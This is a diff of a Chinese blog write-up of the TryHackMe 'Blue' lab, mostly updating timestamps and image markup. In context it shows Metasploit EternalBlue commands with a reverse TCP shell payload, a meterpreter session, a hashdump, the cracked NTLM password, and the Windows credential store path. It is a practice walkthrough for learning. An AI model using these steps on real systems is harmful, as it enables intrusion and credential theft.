@@ -27,7 +27,7 @@
 <meta property="og:description" content="Blue | Try Hack ME靶机">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-03-18T10:43:53.000Z">
-<meta property="article:modified_time" content="2024-03-19T00:19:17.758Z">
+<meta property="article:modified_time" content="2024-03-19T00:43:56.197Z">
 <meta property="article:author" content="sCh3n">
 <meta name="twitter:card" content="summary">
 
@@ -199,7 +199,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-03-19 08:19:17" itemprop="dateModified" datetime="2024-03-19T08:19:17+08:00">2024-03-19</time>
+      <time title="修改时间：2024-03-19 08:43:56" itemprop="dateModified" datetime="2024-03-19T08:43:56+08:00">2024-03-19</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -241,65 +241,32 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.9.224.253</span><br><span class="line">LHOST =&gt; 10.9.224.253</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.122.103</span><br><span class="line">RHOSTS =&gt; 10.10.122.103</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/shell/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/shell/reverse_tcp</span><br></pre></td></tr></table></figure>
 <p>run了下没打通，看了有人说LPORT=4444容易出错，改成1234看看。</p>
 <p>打通了<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240318200407404.png"
-alt="image-20240318200407404" /></p>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240318202647915.png"
-alt="image-20240318202647915" />
-<figcaption aria-hidden="true">image-20240318202647915</figcaption>
-</figure>
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240318200407404.png" /></p>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240318202647915.png" /></p>
 <p>设置下SESSION就可以了，看到Stopping
 exploit/multi/handler的时候就已经拿到shell了，回车退出来就行</p>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319075900745.png"
-alt="image-20240319075900745" />
-<figcaption aria-hidden="true">image-20240319075900745</figcaption>
-</figure>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319075900745.png" /></p>
 <p><code>sessions -l</code>查看sessions</p>
 <p><code>sessions -i 2</code>连接刚刚拿到的meterpreter shell</p>
 <p>hashdump：</p>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319080242203.png"
-alt="image-20240319080242203" />
-<figcaption aria-hidden="true">image-20240319080242203</figcaption>
-</figure>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319080242203.png" /></p>
 <p>https://hashes.com/en/decrypt/hash反查一下看看，密码是alqfna22，算法是NTLM</p>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319080822456.png"
-alt="image-20240319080822456" />
-<figcaption aria-hidden="true">image-20240319080822456</figcaption>
-</figure>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319080822456.png" /></p>
 <p>C盘根目录找到flag1</p>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081034582.png"
-alt="image-20240319081034582" />
-<figcaption aria-hidden="true">image-20240319081034582</figcaption>
-</figure>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081034582.png" /></p>
 <p>存储密码的位置：<code>C:\Windows\System32\config</code>，找到flag2</p>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081258631.png"
-alt="image-20240319081258631" />
-<figcaption aria-hidden="true">image-20240319081258631</figcaption>
-</figure>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081258631.png" /></p>
 <p><code>dir /S "*flag*"</code>查找名字包含flag的文件</p>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081730783.png"
-alt="image-20240319081730783" />
-<figcaption aria-hidden="true">image-20240319081730783</figcaption>
-</figure>
-<figure>
-<img
-src="pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081813032.png"
-alt="image-20240319081813032" />
-<figcaption aria-hidden="true">image-20240319081813032</figcaption>
-</figure>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081730783.png" /></p>
+<p><img
+src="/pictures/Blue%20-Try%20Hack%20ME靶机/image-20240319081813032.png" /></p>
 <p>找到flag3</p>
 
     </div>
